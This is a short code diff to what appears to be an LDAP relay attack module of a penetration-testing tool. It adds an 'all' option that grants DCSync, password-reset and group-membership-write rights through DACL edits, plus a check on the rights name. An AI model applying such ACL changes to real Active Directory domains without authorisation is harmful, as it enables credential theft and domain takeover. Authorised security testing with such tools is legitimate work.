@@ -570,6 +570,7 @@ class LDAPAttack(ProtocolAttack):
     def aclAttack(self, userDn, domainDumper):
         rights = {
                 'dcsync':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'],
+                'all':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','00299570-246d-11d0-a768-00aa006e0529','bf9679c0-0de6-11d0-a285-00aa003049e2'],
                 'resetpassword':['00299570-246d-11d0-a768-00aa006e0529'],
                 'writemembers':['bf9679c0-0de6-11d0-a285-00aa003049e2']
             }
@@ -601,9 +602,13 @@ class LDAPAttack(ProtocolAttack):
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
 
         if not self.args.delete:
-            for guid in rights[self.args.rights]:
-                secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
-                secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+            if self.args.rights.lower() in list(rights.keys()):
+                for guid in rights[self.args.rights]:
+                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
+            else:
+                LOG.error(f'{self.args.rights} right is not valid')
+                return
         else:
             accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
             for guid in rights[self.args.rights]:
